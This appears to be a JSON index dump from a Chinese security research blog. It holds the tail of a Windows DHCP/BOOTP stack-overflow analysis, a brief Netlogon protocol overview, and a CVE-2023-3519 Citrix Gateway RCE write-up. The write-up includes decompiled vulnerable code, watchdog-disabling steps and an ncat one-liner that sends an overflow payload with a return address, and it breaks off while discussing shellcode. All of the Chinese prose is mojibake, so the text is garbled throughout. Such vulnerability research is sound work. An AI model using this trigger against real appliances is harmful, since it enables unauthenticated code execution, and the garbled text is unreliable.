é€’DHCPæ¶ˆæ¯ç±»å‹ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯æ“ä½œç¼–å·ï¼Œç¬¬äºŒä¸ªå­—èŠ‚æ’ä¸º1ï¼Œç¬¬ä¸‰ä¸ªå­—èŠ‚æ˜¯æ¶ˆæ¯ç±»å‹ï¼ŒèŒƒå›´æ˜¯1-9 æ ¹æ®ä»£ç ï¼Œå½“DHCPä¸­å«æœ‰option 53ä¸€å®šä¼šè¿›å…¥ DhcpExtractOptionsFromMessageçš„ if ( BYTE1(v9-\u0026gt;OptionID) )ï¼ŒæŠŠa3[1]èµ‹å€¼ä¸ºä¸ä¸ºé›¶çš„å€¼ã€‚ å›åˆ°DhcpProcessMessageå†…ï¼Œv13å°±ä¸ä¸º0ï¼Œä¸èƒ½è¿›å…¥è§¦å‘æ¼æ´çš„é€»è¾‘ é‡æ–°æ„é€ DHCPæ•°æ®åŒ…,ï¼Œåˆ é™¤option53å¹¶å°† Hardware address lengthæ”¹ä¸º100ï¼Œå•æ­¥è°ƒè¯•ï¼ŒæˆåŠŸè¿›å…¥åˆ° DhcpAddArpEntryå‡½æ•°å†…ã€‚\n0:004\u0026gt; k Child-SP RetAddr Call Site 0000000e`3487f2a0 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x14a 0000000e`3487f380 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`3487f480 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`3487f540 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`3487f5a0 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`3487f5d0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`3487f610 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`3487f910 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`3487f940 00000000`00000000 ntdll!RtlUserThreadStart+0x21 åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæ‰§è¡Œmemcpyæ—¶é•¿åº¦å‚æ•°ä¸º0x64ï¼Œç»§ç»­è¿è¡Œåˆ™è§¦å‘äº†æ ˆæº¢å‡ºï¼Œè¿›ç¨‹å¼‚å¸¸é€€å‡ºã€‚\n0:005\u0026gt; g Breakpoint 9 hit ipnathlp!DhcpAddArpEntry+0x184: 00007ff9`c0012570 e83db80600 call ipnathlp!memcpy (00007ff9`c007ddb2) 0:005\u0026gt; rr8 r8=0000000000000064 0:005\u0026gt; g STATUS_STACK_BUFFER_OVERRUN encountered (1858.3b4): Break instruction exception - code 80000003 (first chance) KERNELBASE!UnhandledExceptionFilter+0x7c: 00007ff9`ec55dd3c cc int 3 0:005\u0026gt; k Child-SP RetAddr Call Site 0000000e`34b7efa0 00007ff9`c007d096 KERNELBASE!UnhandledExceptionFilter+0x7c 0000000e`34b7f0c0 00007ff9`c007d229 ipnathlp!_raise_securityfailure+0x1a 0000000e`34b7f0f0 00007ff9`c0012600 ipnathlp!_report_gsfailure+0x169 0000000e`34b7f180 00007ff9`c0016766 ipnathlp!DhcpAddArpEntry+0x214 0000000e`34b7f260 00007ff9`c0017797 ipnathlp!DhcpProcessBootpMessage+0x5ea 0000000e`34b7f360 00007ff9`c00143a4 ipnathlp!DhcpProcessMessage+0x123 0000000e`34b7f420 00007ff9`c0006ecf ipnathlp!DhcpReadCompletionRoutine+0x644 0000000e`34b7f480 00007ff9`eebe32ea ipnathlp!NhpIoCompletionRoutine+0x6f 0000000e`34b7f4b0 00007ff9`eeb22f86 ntdll!RtlpTpIoCallback+0xca 0000000e`34b7f4f0 00007ff9`ee0a7614 ntdll!TppWorkerThread+0x456 0000000e`34b7f7f0 00007ff9`eeb226b1 KERNEL32!BaseThreadInitThunk+0x14 0000000e`34b7f820 00000000`00000000 ntdll!RtlUserThreadStart+0x21 0:005\u0026gt; g ntdll!NtWaitForWorkViaWorkerFactory+0x14: 00007ff9`eeb70aa4 c3 ret wireshrkä¸­å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…åè®®ä¸ºBootpã€‚ PoCå‚è€ƒ\rç®€å•å®ç°çš„DHCP Clientå¹¶å°†option 53æ³¨é‡Šï¼Œå°† Hardware address lengthæ”¹ä¸º0x100ã€‚ è¿™ä¸ªæ ˆæº¢å‡ºé•¿åº¦å’Œå†…å®¹å‡ä¸ºå†…å®¹å¯æ§\nå°ç»“ è¿™ä¸ªæ¼æ´èµ·æºäºmemcpyæ—¶srcå’Œlenå‚æ•°å‡æ¥æºäºæ•°æ®åŒ…å†…ï¼Œä¸ºç”¨æˆ·å¯æ§ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡è®¾ç½®è¿‡é•¿é•¿åº¦è§¦å‘memcpyè¶Šç•Œå†™å…¥ï¼Œè§¦å‘æ—¶çš„æ¼æ´å‡½æ•°ä¸ºå¤„ç†BOOTPåè®®ï¼Œè¿™ä¸ªåè®®æ˜¯DHCPåè®®å‰èº«ï¼ŒDHCPå…¼å®¹è¿™ä¸ªåè®®ï¼Œåœ¨å¤„ç†Bootpæ¶ˆæ¯æ—¶ï¼Œæ²¡æœ‰æ£€æŸ¥é•¿åº¦å¯¼è‡´åœ¨å¤åˆ¶macæ—¶å‡ºé”™ã€‚\nå‚è€ƒé“¾æ¥\nhttps://bbs.kanxue.com/thread-278835.htm\nhttps://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/preparing-to-debug-the-service-application#-enabling-the-debugging-of-the-initialization-code\nCreated at 2023-09-18T16:18:40+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/netlogon/","title":"Netlogon","tags":[],"description":"","content":"Overview Netlogon è¿œç¨‹åè®®å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åªèƒ½åœ¨åŠ å…¥åŸŸçš„ç³»ç»Ÿä¸Šè¿è¡Œã€‚\nnetlogonåè®®çš„äº¤äº’è¿‡ç¨‹å¯ä»¥è¯¦ç»†è§£é‡Šå¦‚ä¸‹:\nå®¢æˆ·ç«¯å‘èµ·è¿æ¥,å‘é€åŒ…å«8å­—èŠ‚çš„ClientChallengeçš„NetrServerReqChallenge RPCè°ƒç”¨ç»™æœåŠ¡å™¨ æœåŠ¡å™¨æ”¶åˆ°è°ƒç”¨å,ç”Ÿæˆ8å­—èŠ‚çš„ServerChallengeå‘å›å®¢æˆ·ç«¯ å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä½¿ç”¨Key Derivation FunctionåŸºäºClientChallengeã€ServerChallengeå’Œå¯†ç çš„hashç”Ÿæˆä¼šè¯å¯†é’¥ å®¢æˆ·ç«¯ä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†ClientChallengeè®¡ç®—ClientCredential,å‘é€ç»™æœåŠ¡å™¨ æœåŠ¡å™¨ç«¯ä¼šè¯å¯†é’¥å’ŒClientChallengeè®¡ç®—ClientCredentialï¼Œå’Œå®¢æˆ·ç«¯å‘é€çš„ClientCredentialæ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ æœåŠ¡å™¨ç«¯ä½¿ç”¨ä¼šè¯å¯†é’¥å’ŒServerCallengeè®¡ç®—ServerCredentialï¼Œå‘ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯ä½¿ç”¨ä¼šè¯å¯†é’¥åŠ å¯†ServerCallengeè®¡ç®—ServerCredentialå¹¶å’ŒæœåŠ¡ç«¯å‘é€çš„ServerCredentialä½œæ¯”è¾ƒï¼Œç›¸åŒåˆ™æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½å®Œæˆäº†èº«ä»½æ ¡éªŒ MS-NRPC\nCreated at 2023-08-10T03:30:09+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/","title":"CVE-2023-3519 Cirtix Gateway RCEåˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Citrix ADC åŠ Citrix Gateway ä¸­å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œæœªæˆæƒçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹æ®Šè¯·æ±‚è§¦å‘æ¼æ´ï¼Œé€ æˆRCEã€‚\nå½±å“ç‰ˆæœ¬ NetScaler ADC ã€NetScaler Gateway 13.1 \u0026lt; 13.1-49.13 NetScaler ADC ã€NetScaler Gatewayâ€¯13.0â€¯\u0026lt; 13.0-91.13 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.159 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.297 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.297\nç¯å¢ƒæ­å»º ç”³è¯·å¼€å‘è€…è¯•ç”¨ï¼Œé…ç½®Citrix Gateway æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• æ ¹æ®å›½å¤–å®‰å…¨ç ”ç©¶å‘˜ç ”ç©¶ï¼Œè¯¥æ¼æ´å­˜åœ¨äº/netscaler/nsppeæ–‡ä»¶å†…ï¼Œdiffä¿®å¤å‰å’Œä¿®å¤åçš„nsppeï¼Œä¸»è¦ä¿®æ”¹äº†ns_aaa_gwtest_get_event_and_target_namesç­‰å‡ ä¸ªå‡½æ•° è½¬åˆ°ns_aaa_gwtest_get_event_and_target_nameså‡½æ•°ï¼Œå¯¹æ¯”ä¿®å¤å’Œæœªä¿®å¤çš„ä»£ç ï¼Œä¸»è¦åœ¨è°ƒç”¨ns_aaa_saml_url_decodeå‡½æ•°æ—¶å¯¹v29æ·»åŠ äº†æ ¡éªŒã€‚ è·Ÿè¿›ns_aaa_saml_url_decodeå‡½æ•°ï¼Œè¿›å…¥ns_aaa_saml_url_decode_inner\n__int64 __fastcall ns_aaa_saml_url_decode(__int64 a1, __int64 a2, __int64 a3) { return ns_aaa_saml_url_decode_inner(a1, a2, a3, 1LL); } åœ¨ns_aaa_saml_url_decode_innerå‡½æ•°ä¸­a1æ˜¯ä¸€ä¸ªcharæŒ‡é’ˆï¼ŒæŒ‡å‘äº†httpè¯·æ±‚çš„urlï¼Œåœ¨do whileå¾ªç¯æ—¶éå†a1æ•°ç»„ï¼Œå½“å½“å‰a1æŒ‡å‘çš„å­—ç¬¦æ˜¯%ï¼Œåˆ™è·å–åˆ°è¯¥å­—ç¬¦åé¢ä¸¤ä¸ªå­—ç¬¦é€šè¿‡datatable_ascii2binå¾—åˆ°å¯¹åº”çš„å­—ç¬¦å¹¶å†™å…¥åˆ°v4æŒ‡å‘çš„æ•°ç»„å†…ï¼Œå®é™…ä¸Šè¿™é‡Œæ˜¯urlè§£ç æ“ä½œï¼Œè§£ç åå†™å…¥v4æ•°ç»„ã€‚ å¦‚æœå½“å‰å­—ç¬¦ä¸æ˜¯%åˆ™åˆ¤æ–­æ˜¯ä¸æ˜¯+å·ï¼Œæ˜¯+å·åˆ™åœ¨v4æ•°ç»„å†…å†™å…¥ç©ºæ ¼ã€‚ä¸¤ä¸ªéƒ½ä¸æ˜¯åˆ™ç›´æ¥å†™å…¥åˆ°v4å†…ï¼Œå¯ä»¥çœ‹å‡ºè¿™å—ä»£ç æ˜¯åœ¨å¯¹ä¼ å…¥çš„å­—ç¬¦ä¸²åˆ¤æ–­æ˜¯å¦ä¸ºurlç¼–ç å¦‚æœæ˜¯åˆ™è¿›è¡Œurlè§£ç ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥å†™å…¥v4æ•°ç»„ã€‚\n__int64 __fastcall ns_aaa_saml_url_decode_inner(char *a1, _BYTE *a2, int a3, int a4) { _BYTE *v4; // rax unsigned __int64 v5; // r8 char v6; // bl char *v7; // r9 char v8; // r10 char v9; // r11 LODWORD(v4) = (_DWORD)a2; if ( a3 ) { v5 = (unsigned __int64)\u0026amp;a1[a3]; v4 = a2; do { v6 = *a1; if ( *a1 == \u0026#39;%\u0026#39; ) { v7 = a1 + 2; if ( (unsigned __int64)(a1 + 2) \u0026lt; v5 ) { v8 = a1[1]; if ( (unsigned __int8)(v8 - 48) \u0026lt;= 9u ) { v9 = *v7; if ( (unsigned __int8)(*v7 - 48) \u0026lt; 0xAu || (unsigned __int8)((v9 | 0x20) - 97) \u0026lt; 6u ) { if ( v9 != 53 ) v7 = a1; if ( (unsigned __int64)(a1 + 4) \u0026gt;= v5 ) v7 = a1; if ( v8 != 50 ) v7 = a1; if ( !a4 ) v7 = a1; *v4 = datatable_ascii2bin[(unsigned __int8)v7[2]] + 16 * datatable_ascii2bin[(unsigned __int8)v7[1]]; a1 = v7 + 3; goto LABEL_4; } } } } else if ( v6 == \u0026#39;+\u0026#39; ) { *v4 = 32; ++a1; goto LABEL_4; } ++a1; *v4 = v6; LABEL_4: ++v4; } while ( (unsigned __int64)a1 \u0026lt; v5 ); } return (unsigned int)((_DWORD)v4 - (_DWORD)a2); } åœ¨å¾ªç¯ä¸­ï¼Œå†™å…¥çš„æ•°ç»„æ¥æºäºä¼ å…¥çš„å‚æ•°a2ï¼Œå¹¶ä¸”do whileå¾ªç¯ç»“æŸæ˜¯é€šè¿‡åˆ¤æ–­a1 \u0026lt; v5ï¼Œv5 = \u0026amp;a1[a3];a1æ˜¯ä¼ å…¥çš„charæ•°ç»„ï¼Œa3æ˜¯ä¼ å…¥çš„intã€‚å‘ä¸Šè¿½æº¯è°ƒç”¨å‚æ•°æ¥æºã€‚ ns_aaa_saml_url_decodeå‡½æ•°çš„v5æœ€ç»ˆæ¥æºäºä¼ å…¥çš„a1å‚æ•°ï¼Œa2ä¸ºä¼ å…¥çš„å‚æ•°ï¼Œv25æ¥æºäº*(a1+174)ã€‚ä¸éš¾çŒœæµ‹a1åº”ä¸ºä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘çš„ç»“æ„ä½“ä¸­å­˜å‚¨äº†æŒ‡å‘å­˜å‚¨è¯·æ±‚urlçš„charæ•°ç»„åŠè¯¥æ•°ç»„çš„é•¿åº¦ï¼Œè¯¥æ®µä»£ç ä¸ºè§£æurlçš„å„ä¸ªå‚æ•°ï¼Œå¹¶æ ¹æ®å‚æ•°ä¸åŒè¿›è¡Œçš„æ“ä½œã€‚\n__int64 __fastcall ns_aaa_gwtest_get_event_and_target_names(__int64 a1, __int64 a2, unsigned int *a3) { unsigned int v3; // r13d unsigned int *v4; // rbx __int64 v5; // r12 unsigned int v6; // r14d __int64 v7; // r13 __int64 v8; // r12 int v9; // r8d __int64 v10; // r10 unsigned __int16 v11; // ax __int64 v12; // rcx unsigned int v13; // eax int v14; // ecx bool v15; // cf int v16; // eax __int64 v17; // rcx int v19; // r14d __int64 v20; // rax int v21; // ecx unsigned int v22; // r13d __int64 v23; // rax unsigned int v24; // edx __int64 v25; // rdx int v26; // eax unsigned int v27; // [rsp+0h] [rbp-50h] __int64 v28; // [rsp+18h] [rbp-38h] BYREF __int64 v29; // [rsp+20h] [rbp-30h] v3 = *(unsigned __int16 *)(a1 + 174); v27 = v3 - 17; if ( v3 \u0026lt; 0x20 ) { v4 = a3; v5 = 0LL; v6 = 1441793; v7 = 0LL; goto LABEL_7; } v8 = *(_QWORD *)(a1 + 36); v29 = v8 + 17; v4 = a3; if ( (unsigned int)strncmp(\u0026#34;event=\u0026#34;, v8 + 17, 6LL) ) { v6 = 1441800; LABEL_5: v5 = 0LL; goto LABEL_6; } if ( !(unsigned int)strncmp(v8 + 23, \u0026#34;start\u0026amp;\u0026#34;, 6LL) ) { v19 = -29; v20 = 29LL; v21 = 1; } else { if ( (unsigned int)strncmp(v8 + 23, \u0026#34;done\u0026amp;\u0026#34;, 5LL) ) { v6 = 1441801; goto LABEL_5; } v19 = -28; v20 = 28LL; v21 = 2; } *v4 = v21; v5 = v20 + v8; v22 = v3 + v19; v6 = 1441802; v27 = v22; if ( (unsigned int)strncmp(\u0026#34;target=\u0026#34;, v5, 7LL) ) goto LABEL_6; v23 = _wrap_memchr(v5 + 7, 38LL, (int)(v22 - 7)); v24 = v22 - 7; v25 = v24 + 1; if ( (_DWORD)v25 != v22 - 6 ) { LABEL_6: v7 = v29; goto LABEL_7; } v26 = ns_aaa_saml_url_decode(v5 + 7, a2, v25); ns_aaa_gwtest_get_event_and_target_namesç”±ns_aaa_gwtest_get_valid_fsso_serverè°ƒç”¨ï¼Œå…¶ä¸­v15ä¸ºæ ˆå†…charæ•°ç»„ï¼Œå¤§å°ä¸º128å­—èŠ‚ã€‚åˆ†æåˆ°è¿™å¯ä»¥çŒœæµ‹ï¼Œç”±äºè¯·æ±‚urlçš„å‚æ•°å¯æ§ï¼Œè‡ªç„¶è¯·æ±‚urlé•¿åº¦ä¹Ÿå¯æ§ï¼Œè€Œv15è¿™ä¸ªæ•°ç»„ä¸ºæ ˆå†…æ•°ç»„ï¼Œå¤§å°ä¸º128å­—èŠ‚ã€‚ns_aaa_saml_url_decode_innerå‡½æ•°ä¸­å¾ªç¯æ¬¡æ•°ç”±urlé•¿åº¦å†³å®šï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ§åˆ¶å†™å…¥v15æ•°ç»„çš„å­—èŠ‚æ•°ï¼Œå¦‚æœurlè¿‡é•¿åˆ™åœ¨å¾ªç¯æ—¶å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡128å­—èŠ‚ï¼Œé€ æˆæ ˆæº¢å‡ºã€‚\n__int64 __fastcall ns_aaa_gwtest_get_valid_fsso_server(__int64 a1) { __int64 v1; // rbx unsigned int v2; // eax int v4; // r8d int v5; // r9d unsigned __int16 v6; // ax int v7; // r8d int v8; // r9d __int64 v9; // rcx unsigned int v10; // eax int v11; // ecx bool v12; // cf int v13; // eax __int64 v14; // rcx __int128 v15[8]; // [rsp+10h] [rbp-A0h] BYREF unsigned int v16; // [rsp+94h] [rbp-1Ch] BYREF __int64 v17; // [rsp+98h] [rbp-18h] BYREF int v18[3]; // [rsp+A4h] [rbp-Ch] BYREF memset(v15, 0, sizeof(v15)); v16 = 0; v18[0] = 0; if ( (unsigned int)ns_aaa_gwtest_get_event_and_target_names(a1, (__int64)v15, \u0026amp;v16) ) å‘ä¸Šè¿½æº¯è°ƒç”¨åˆ°è¯¥å‡½æ•°éœ€è¦çš„è·¯å¾„ï¼Œns_aaa_gwtest_get_valid_fsso_serverç”±ns_aaa_gwtest_handlerè°ƒç”¨ï¼Œåœ¨ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å½“è¯·æ±‚url+8å¤„ä¸ºformsssoæ—¶æ‰ä¼šè¿›å…¥åˆ°è°ƒç”¨ns_aaa_gwtest_get_valid_fsso_serverå‡½æ•°çš„é€»è¾‘ã€‚\n__int64 __fastcall ns_aaa_gwtest_handler(__int64 a1, __int64 a2, __int64 a3, __int64 a4) { __int64 v5; // r15 __int64 v6; // rax __int64 v7; // rcx _QWORD *v8; // rax unsigned int v9; // r13d __int64 valid_fsso_server; // rax __int64 v11; // rbx unsigned int v12; // r14d __int64 v13; // rax __int64 is_valid_auth_action; // rax __int64 v15; // rax __int64 v16; // rcx unsigned int v17; // eax __int64 v18; // rcx __int64 v20; // rcx __int64 v21; // rdx __int64 v22; // [rsp+0h] [rbp-30h] v5 = a3; v6 = ns_async_ctx; if ( ns_async_ctx ) { v20 = (unsigned int)ns_async_callers_context_size; if ( *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 1486 ) panic_0(\u0026#34;Incorrect context id in ASYNC_SAVE_CTX\u0026#34;, a2, a3, (unsigned int)ns_async_callers_context_size, a4); v12 = *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112); v11 = *(_QWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 116); *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 112) = 0; *(_QWORD *)(v6 + v20 + 116) = 0LL; goto LABEL_41; } v7 = *(_QWORD *)(a2 + 36); v8 = (_QWORD *)(v7 + 8); a3 = *(_DWORD *)(v7 + 8) | 0x20202020u; v9 = 32; if ( (int)a3 \u0026lt;= \u0026#39;lmar\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;?dck\u0026#39; ) { v12 = 7; v11 = 0LL; goto LABEL_41; } if ( (_DWORD)a3 == 1752462689 ) { if ( (*v8 | 0x2020202020202020LL) != \u0026#39;vreshtua\u0026#39; || (*(unsigned __int16 *)(v7 + 16) | 0x2020) != 29285 || (*(_BYTE *)(v7 + 18) | 0x20) != 63 ) { return v9; } v22 = a4; is_valid_auth_action = ns_aaa_gwtest_is_valid_auth_action(a2); if ( is_valid_auth_action ) { v11 = is_valid_auth_action; v12 = 1; goto LABEL_39; } return 3907; } if ( (_DWORD)a3 != \u0026#39;lluf\u0026#39; ) return v9; v12 = 9 * ((*(_BYTE *)(v7 + 12) | 0x20) == 63); LABEL_20: v11 = 0LL; if ( !v12 ) return v9; goto LABEL_41; } if ( (int)a3 \u0026lt;= \u0026#39;nahb\u0026#39; ) { if ( (_DWORD)a3 == \u0026#39;lmas\u0026#39; ) { if ( (*(_WORD *)(v7 + 12) | 0x2020) == (*(_WORD *)\u0026#34;SP?\u0026#34; | 0x2020) \u0026amp;\u0026amp; (*(_BYTE *)(v7 + 14) | 0x20) == (aSamlsp_0[6] | 0x20) ) { v22 = a4; v13 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v13 ) { v11 = v13; v12 = 3; goto LABEL_39; } } else { if ( (*(_WORD *)(v7 + 12) | 0x2020) != (*(_WORD *)\u0026#34;IdP?\u0026#34; | 0x2020) || (*(_BYTE *)(v7 + 14) | 0x20) != (aSamlidp_1[6] | 0x20) ) { return v9; } v22 = a4; v15 = ns_aaa_gwtest_is_valid_auth_action(a2); if ( v15 ) { v11 = v15; v12 = 4; goto LABEL_39; } } } else { if ( (_DWORD)a3 != \u0026#39;mrof\u0026#39; || (*v8 | 0x2020202020202020LL) != \u0026#39;osssmrof\u0026#39; || (*(_BYTE *)(v7 + 16) | 0x20) != 63 ) return v9; v22 = a4; valid_fsso_server = ns_aaa_gwtest_get_valid_fsso_server(a2); ns_aaa_gwtest_handlerç”±ns_vpn_process_unauthenticated_requestå‡½æ•°è°ƒç”¨ï¼Œåœ¨ns_vpn_process_unauthenticated_requestå‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼Œå½“è¯·æ±‚è·¯å¾„ä¸º/gwtest/æ—¶è¿›å…¥è°ƒç”¨åˆ°ç›®æ ‡å‡½æ•°çš„é€»è¾‘ã€‚\nif ( v51 == 1702131559 ) { if ( (*(_QWORD *)v26 | \u0026#39; \u0026#39;) != \u0026#39;/tsetwg/\u0026#39; ) goto LABEL_2888; LABEL_437: if ( ns_async_ctx \u0026amp;\u0026amp; *(_DWORD *)(ns_async_ctx + (unsigned int)ns_async_callers_context_size + 108) != 652 ) panic_0( \u0026#34;Async context ID does not match expected context ID NS_ASYNC_CTX_AAA_UNAUTH_GWTEST\u0026#34;, a2, v25, (unsigned int)ns_async_callers_context_size, v26); v25 = (unsigned int)(ns_async_callers_context_size + 192); ns_async_callers_context_size += 192; v30 = v1891; if ( ns_async_ctx ) { if ( *(_DWORD *)(ns_async_ctx + 8) != -87101427 ) goto LABEL_4683; if ( (unsigned int)v25 \u0026lt; *(_DWORD *)(ns_async_ctx + 104) ) { a2 = (unsigned int)v25; v25 = (unsigned int)(*(_DWORD *)(ns_async_ctx + (unsigned int)v25 + 108) - 172); if ( (unsigned int)v25 \u0026gt;= 0x611 ) goto LABEL_759; } } v164 = ns_aaa_gwtest_handler((__int64)v1896, v1897, 0LL, v1891); ç»¼ä¸Šå¯ä»¥æ€»ç»“åˆ°è°ƒç”¨åˆ°æ¼æ´å‡½æ•°ns_aaa_saml_url_decode_inneræ‰€éœ€è¦çš„urlä¸ºï¼š\nhttp://target/gwtest/formssso?event=start\u0026amp;target=[overflow char] åªéœ€è¦è®©[overflow char]è¿‡é•¿å³å¯æº¢å‡ºåœ¨ns_aaa_gwtest_get_valid_fsso_serverå‡½æ•°å†…çš„charæ•°ç»„ï¼Œé€ æˆæº¢å‡ºã€‚æŸ¥çœ‹nsppeé˜²æŠ¤ï¼Œå¯ä»¥å‘ç°PIE,CANARYéƒ½æ²¡å¼€ï¼Œåªéœ€è¦åˆ©ç”¨æ ˆæº¢å‡ºå†™å…¥shellcodeç„¶åjmp espå³å¯æ‰§è¡Œshellcodeã€‚\n# checksec --file=nsppe_unpatched RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE No RELRO Canary found NX disabled No PIE No RPATH No RUNPATH 68527 Symbols No 0 0 nsppe_unpatched åŠ¨æ€è°ƒè¯•\næ‰¾åˆ°nsppeè¿›ç¨‹\nroot@citrix3# ps aux | grep nsppe root 457 100.0 43.2 693320 693560 - Rs 19:10 223:34.32 nsppe (NSPPE-00) ç¦ç”¨çœ‹é—¨ç‹—ï¼Œä½¿ç”¨å‘½ä»¤ç¦æ­¢å‘é€è¯¥ä¿¡å·\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 ä½¿ç”¨Citrix ADCè‡ªå¸¦çš„gdbé™„åŠ è°ƒè¯•nsppe\ngdb /netscaler/nsppe 461 ä½¿ç”¨pattern_creat.rbåˆ›å»ºå­—ç¬¦ä¸²\nâ”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag å‘é€payloadï¼Œè§¦å‘æ¼æ´ï¼Œæ­¤æ—¶rspä¸º6641376641366641ï¼Œå¯¹åº”offsetä¸º168ï¼Œä¹Ÿå°±æ˜¯168å¼€å§‹è¦†ç›–rsp å‘é€payloadï¼Œè§¦å‘æ¼æ´ï¼Œæ­¤æ—¶ripæŒ‡å‘0xccæŒ‡ä»¤åœ°å€ï¼Œgdbæ–­ä¸‹\necho -ne \u0026#39;GET /gwtest/formssso?event=start\u0026amp;target=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x62\\x8c\\x6d\\x00\\x00\\x00\\x00\\x00\\xcc HTTP/1.1\\r\\nHost: 192.168.52.108\\r\\n\\r\\n\u0026#39; | ncat --ssl 192.168.52.108 443 åœ¨gdbä¸­å¯ä»¥çœ‹åˆ°ç¼“å†²åŒºä½äºrbp-0xa0å¤„ã€‚ é€šè¿‡è°·æ­Œï¼ŒçŸ¥é“åœ¨Citrix ADCä¸­ï¼Œnsppeæ˜¯ç½‘ç»œå­ç³»ç»Ÿï¼Œä¸€å½“nsppeè¿›ç¨‹downäº†ï¼Œä¼šé€ æˆç³»ç»Ÿæ— æ³•å¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œæœ€ç›´è§‚çš„è¡¨ç°å°±æ˜¯å½“sshè¿æ¥ç›®æ ‡ç³»ç»Ÿå¹¶ä½¿ç”¨gdbè°ƒè¯•nsppeè¿›ç¨‹çš„æ—¶å€™ï¼Œsshä¼šå¡æ­»ï¼Œè€Œåé€€å‡ºï¼Œå› ä¸ºæœåŠ¡å™¨çš„ç½‘ç»œå­ç³»ç»Ÿå¤„äºè°ƒè¯•çŠ¶æ€ï¼Œæ²¡åŠæ³•å¤„ç†ç½‘ç»œè¯·æ±‚ã€‚\næ‰€ä»¥åœ¨æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†ä¿è¯èƒ½å¤Ÿè·å–åˆ°shell/ä¿æ´»ç³»ç»Ÿï¼Œè¦ä¿è¯nsppeè¿›ç¨‹ä¸ä¼šæŒ‚æ‰ã€‚é€šè¿‡shellcodeè°ƒç”¨popenå‡½æ•°ç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶è¿”å›åˆ°ä¸Šå±‚è°ƒç”¨æ ˆï¼ˆä¿è¯è¯·æ±‚æ­£å¸¸è¿”å›ï¼‰ã€‚\nä¹‹åå°±æ˜¯å¸¸è§„åˆ™shellcodeç¼–å†™äº†ï¼Œç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶æ–‡ä»¶å†…ç¡¬ç¼–ç 